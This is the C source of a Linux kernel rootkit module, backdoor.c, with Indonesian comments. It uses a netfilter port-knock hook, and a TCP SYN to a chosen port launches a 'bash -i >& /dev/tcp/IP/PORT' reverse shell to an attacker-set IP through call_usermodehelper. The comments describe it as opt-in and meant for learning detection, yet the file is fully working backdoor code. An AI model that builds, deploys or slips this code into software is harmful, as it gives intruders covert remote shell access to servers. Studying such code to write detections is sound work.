/*
 * backdoor.c — port-knock -> reverse shell (OPT-IN).
 *
 * Tidak ada yang jalan kecuali kamu MENYETEL backdoor_ip saat insmod:
 *   insmod rkit.ko backdoor_ip=<ip-kamu> backdoor_port=4444 knock_port=1337
 *
 * Alur:
 *   1. paket TCP SYN ke knock_port (default1337) terdeteksi oleh hook
 *      netfilter NF_INET_LOCAL_IN (hanya init_net — catat di docs)
 *   2. dipecat ke workqueue (konteks proses — aman untuk UMH)
 *   3. call_usermodehelper menjalankan:
 *        /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
 *      -> shell interaktif dari server ke listener kamu
 *
 * Koneksi keluar ini = IOC klasik (lihat docs/DETECTION.md) — memang
 * disengaja untuk edukasi: belajar MENDETEKSI pola ini.
 *
 * Throttle: minimal5 detik antar-fire (anti flood).
 */
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/net_namespace.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/jiffies.h>
#include <linux/workqueue.h>
#include <linux/kmod.h>
#include <linux/kernel.h>        /* snprintf */
#include <linux/string.h>
#include <linux/printk.h>
#include "rkit.h"

static char *backdoor_ip;                 /* kosong = fitur nonaktif */
static unsigned int backdoor_port = 4444;
static unsigned int knock_port = 1337;
module_param(backdoor_ip,   charp, 0000);
module_param(backdoor_port, uint,  0000);
module_param(knock_port,    uint,  0000);

static struct work_struct g_fire_ws;
static unsigned long g_last_fire;
static bool g_hook_registered;

static void fire_worker(struct work_struct *ws)
{
	char cmd[160];
	char *argv[4];
	char *envp[] = { "HOME=/", "PATH=/usr/bin:/bin", NULL };

	(void)ws;
	if (!backdoor_ip || !backdoor_ip[0])
		return;
	snprintf(cmd, sizeof(cmd), "bash -i >& /dev/tcp/%s/%u 0>&1",
		 backdoor_ip, backdoor_port);
	argv[0] = "/bin/bash";
	argv[1] = "-c";
	argv[2] = cmd;
	argv[3] = NULL;
	/* UMH_WAIT_EXEC: cukup sampai prosesnya jalan, jangan blokir */
	if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC))
		pr_warn("rkit: backdoor gagal dijalankan\n");
	else
		pr_info("rkit: backdoor dipecat ke %s:%u\n",
			backdoor_ip, backdoor_port);
}

static unsigned int knock_hook(void *priv, struct sk_buff *skb,
			       const struct nf_hook_state *state)
{
	struct iphdr *iph;
	struct tcphdr *th;

	(void)priv;
	(void)state;
	if (!backdoor_ip || !backdoor_ip[0])
		return NF_ACCEPT;
	if (!pskb_may_pull(skb, sizeof(struct iphdr) + sizeof(struct tcphdr)))
		return NF_ACCEPT;
	iph = ip_hdr(skb);
	if (iph->protocol != IPPROTO_TCP)
		return NF_ACCEPT;
	th = (struct tcphdr *)((char *)iph + iph->ihl * 4);
	if (!th->syn || th->ack)
		return NF_ACCEPT;
	if (ntohs(th->dest) != knock_port)
		return NF_ACCEPT;

	/* throttle5 detik */
	if (time_before(jiffies, g_last_fire + 5 * HZ))
		return NF_ACCEPT;
	g_last_fire = jiffies;
	schedule_work(&g_fire_ws);
	return NF_ACCEPT;
}

static struct nf_hook_ops g_ops = {
	.hook     = knock_hook,
	.pf       = AF_INET,
	.hooknum  = NF_INET_LOCAL_IN,
	.priority = NF_IP_PRI_FIRST,
};

const char *rk_backdoor_status(void)
{
	if (!backdoor_ip || !backdoor_ip[0])
		return "nonaktif (backdoor_ip kosong)";
	if (!g_hook_registered)
		return "gagal daftar hook";
	return "aktif";
}

int rk_backdoor_init(void)
{
	int ret;

	INIT_WORK(&g_fire_ws, fire_worker);

	if (!backdoor_ip || !backdoor_ip[0])
		return 0;                 /* nonaktif = bukan kegagalan */

	ret = nf_register_net_hook(&init_net, &g_ops);
	if (ret) {
		pr_warn("rkit: backdoor: nf_register_net_hook gagal (%d)\n", ret);
		return ret;
	}
	g_hook_registered = true;
	pr_info("rkit: backdoor AKTIF — knock TCP %u -> shell ke %s:%u\n",
		knock_port, backdoor_ip, backdoor_port);
	return 0;
}

void rk_backdoor_exit(void)
{
	if (g_hook_registered) {
		nf_unregister_net_hook(&init_net, &g_ops);
		g_hook_registered = false;
	}
	cancel_work_sync(&g_fire_ws);
}
